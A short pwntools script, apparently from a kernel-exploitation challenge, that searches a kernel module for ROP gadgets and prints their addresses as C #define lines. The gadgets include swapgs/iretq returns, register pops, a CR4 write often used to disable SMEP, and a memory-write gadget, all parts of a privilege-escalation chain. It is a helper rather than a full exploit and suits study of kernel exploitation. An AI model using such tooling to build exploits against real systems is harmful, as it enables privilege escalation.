from pwn import *
context.arch="x86_64"
ko=ELF("./pwn.ko")

def search_ko(data):
    if data[-1]==";":
        data=data[:-1]
    asm_data=asm(data)
    msg=data.replace(';', '_')
    msg=msg.replace(' ', '_')
    msg=msg.replace(',', '_')
    msg=msg.replace('[', '_')
    msg=msg.replace(']', '_')
    msg=msg.upper().ljust(20)
    addr=ko.search(asm_data).__next__()
    print("#define ",msg,"\t",hex(addr))
search_ko("swapgs;popfq;ret;")
search_ko("iretq;ret;")
search_ko("pop rdi;ret;")
search_ko("pop rax;ret;")
search_ko("mov cr4,rdi;ret;")
search_ko("mov [rdi],rax;ret;")
